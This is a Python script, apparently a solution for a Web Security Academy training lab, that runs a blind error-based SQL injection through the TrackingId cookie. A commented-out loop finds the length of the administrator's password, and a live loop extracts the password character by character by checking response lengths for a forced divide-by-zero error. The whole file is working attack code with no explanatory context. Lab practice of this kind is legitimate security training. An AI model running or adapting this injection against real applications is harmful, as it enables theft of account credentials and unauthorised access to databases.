import requests
import string

url = "https://0a0a0054039ed96983ccfc1000bb00f6.web-security-academy.net"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

char=string.ascii_letters+string.digits

error_length=2226

password=''

# determine the Length of the password

# for i in range(50):
#     cookie = {"TrackingId":f"1QCuMg9N81AOv3yz'||(SELECT CASE WHEN LENGTH(password)>{i+1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"}
#     r =requests.get(url,cookies=cookie,proxies=proxies,verify=False)
#     if len(r.text)!=2226:
#         print(i+1)
#         break

for i in range(1,21):
    for x in char:
        cookie = {"TrackingId":f"1QCuMg9N81AOv3yz'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{x}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"}
        r=requests.get(url,cookies=cookie)
        if len(r.text)==2226:
            password+=x
            print("[+] Password: "+password)
